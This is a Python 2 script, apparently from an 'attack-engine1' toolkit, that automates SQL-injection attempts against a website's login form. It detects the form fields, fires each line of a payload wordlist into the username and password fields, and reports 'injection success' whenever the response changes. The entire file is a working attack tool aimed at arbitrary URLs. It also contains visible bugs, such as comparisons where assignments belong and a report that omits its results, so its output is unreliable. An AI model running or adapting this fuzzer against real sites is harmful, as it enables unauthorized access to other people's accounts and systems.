#!/usr/bin/python

from datetime import datetime
from bs4 import BeautifulSoup
from Colour import Colour
import mechanize
import requests
import urllib
import os



def SqlInject(url):
	time = str(datetime.now())
	print time + "\n"	
	i = 0
	destination = ""
	NamePassword= ""
	NameUser = ""
	NameHidden=""
	NameSubmit=""
	ValueHidden=""
	ValueSubmit=""
	from detectinput import DetectFormInput
	names,types,values,destination,method = DetectFormInput(url)
	print "\ninput names\n" 
	print names
	print "\ninpt types\n"
	print types
	print "\nvalues\n"
	print values
	print "\nform destination\n"
	print destination
	print "\nform method\n" 
	print method 
	for typee in types :
		
		if typee != "password" and typee != "submit" and typee == "hidden":		
			NameUser = names[i]
		if typee == "password":
			NamePassword = names[i]
		elif typee == "submit" :
			NameSubmit = names[i]
			ValueSubmit = values[i]
		elif typee == "hidden" :
				NameHidden == names[i]
				ValueHidden == values[i]
		i = i+1

	if destination =="" or destination =="#" : 
		DestinationUrl = url
	else :
		DestinationUrl = url+"/"+destination  
	post_params_test = {
			NameUser : "for@test.com",
			NamePassword : "for-test",
			NameSubmit : ValueSubmit,
			NameHidden : ValueHidden
			}
	post_args = urllib.urlencode(post_params_test)
	gurl = DestinationUrl+"/?"+post_args
	testResult = urllib.urlopen(gurl, post_args)
        testResult = str(testResult.read())
	sqlInjected=[]
	if (os.path.exists('~/attack-engine1/outputFiles/sqlinjectionRepport.txt') == False ):
		os.system('touch ~/attack-engine1/outputFiles/sqlinjectionRepport.txt')
	path = os.path.join(os.path.expanduser('~'), 'attack-engine1', 'outputFiles', 'sqlinjectionRepport.txt')
	with open("sqlword.txt","r") as f:
		#j = 1
		Res='the domaine is '+url+'\n'
		for line in f:
			post_params = {
			NameUser : line,
			NamePassword : line,
			NameSubmit : ValueSubmit,
			NameHidden : ValueHidden
			}
			print (Colour.BLUE+"[+] testing  "+Colour.END +line.rstrip())
			post_args = urllib.urlencode(post_params)
			gurl = DestinationUrl+"/?"+post_args
			injectedResult = urllib.urlopen(gurl, post_args)
			injectedResult = str(injectedResult.read())
			Res+=line
			if injectedResult == testResult :
				print (Colour.RED+"[!] injection failed with this line "+Colour.END+"\n" )
				Res+='\n'
				Res+=injectedResult		
			else :
				print (Colour.GREEN+"[*] injection success with this line "+Colour.END+"\n")
				sqlInjected.append(line)
				Res+='\n'
				Res+=injectedResult				
			#j = j+1
	with open(path, "w") as text_file:
		text_file.write("%s" % time)
		text_file.write("\n")
		#text_file.write("%s" % res)
		time = str(datetime.now())
		text_file.write("\n")
		text_file.write("%s" % time)
		print "\n"+time
	return sqlInjected
